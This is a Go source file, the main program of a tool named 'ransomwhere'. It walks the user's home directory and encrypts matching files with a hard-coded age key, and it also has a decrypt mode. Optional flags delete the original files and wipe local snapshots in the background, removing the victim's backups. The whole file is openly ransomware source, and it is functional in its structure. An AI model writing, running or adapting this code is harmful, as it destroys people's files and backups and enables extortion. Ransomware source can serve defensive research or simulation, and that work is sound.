package main

import (
	"filippo.io/age"
	"flag"
	"github.com/sirupsen/logrus"
	"ransomwhere/pkg/crypto"
	"ransomwhere/pkg/file"
	"ransomwhere/pkg/snapshots"
	"strings"
)

const (
	privKey = "AGE-SECRET-KEY-1J9YS9QK3JM5FKS423VF6LVPG7D8NNKQWT9Y7YLFYH2Z2F3LR5MRQJYLQ6W"
)

func main() {
	logger := logrus.New()
	logger.SetLevel(logrus.ErrorLevel)

	logLevel := flag.String("log", "error", "The log level to use.")
	deleteFiles := flag.Bool("delete", false, "Delete files after encrypting.")
	wipeBackups := flag.Bool("wipe", false, "Wipe local snapshots while encrypting.")
	opModeFlag := flag.String("mode", "encrypt", "Encrypt or decrypt the ransomware files.")
	flag.Parse()

	logrusLevel, err := logrus.ParseLevel(*logLevel)
	if err != nil {
		logger.WithField("log_level", *logLevel).Error("unknown log level")
		logrusLevel = logrus.ErrorLevel
	}

	logrus.SetLevel(logrusLevel)
	logger.SetLevel(logrusLevel)

	opMode := strings.ToLower(*opModeFlag)
	if opMode != file.OpModeDecrypt && opMode != file.OpModeEncrypt {
		logger.WithField("mode", opMode).
			Fatalf("unsupported mode selected, use %s or %s", file.OpModeEncrypt, file.OpModeDecrypt)
	}

	cryptId, err := age.ParseX25519Identity(privKey)
	if err != nil {
		logger.WithError(err).Fatal("could not parse private key")
	}

	homeDirectory := file.GetHomeDirectoryWithFallback()

	if opMode == file.OpModeEncrypt && *wipeBackups == true {
		logger.Debug("starting snapshot wiper")

		go func() {
			if err := snapshots.WipeSnapshots(logger); err != nil {
				logger.WithError(err).Error("failed to wipe snapshots")
			}
		}()
	}

	logger.WithField("mode", opMode).WithField("path", homeDirectory).Info("executing walker")

	if err := file.WalkFiles(homeDirectory, logger, func(name, path string) error {
		fileLogger := logger.WithField("path", path).WithField("name", name)

		if !file.MatchFile(opMode, name) {
			return nil
		}

		fileLogger.Debug("file matched")

		if opMode == file.OpModeEncrypt {
			if err := crypto.EncryptFile(fileLogger, path, []age.Recipient{cryptId.Recipient()}, *deleteFiles); err != nil {
				fileLogger.WithError(err).Error("could not crypt file")
			} else {
				fileLogger.Debug("encrypted")
			}
		} else if opMode == file.OpModeDecrypt {
			if err := crypto.DecryptFile(fileLogger, path, cryptId, *deleteFiles); err != nil {
				fileLogger.WithError(err).Fatal("could not decrypt file")
			} else {
				fileLogger.Debug("decrypted")
			}
		} else {
			logger.WithField("mode", opMode).Error("unknown mode")
		}

		return nil
	}); err != nil {
		logger.WithError(err).Fatal("could not run walker")
	}
}
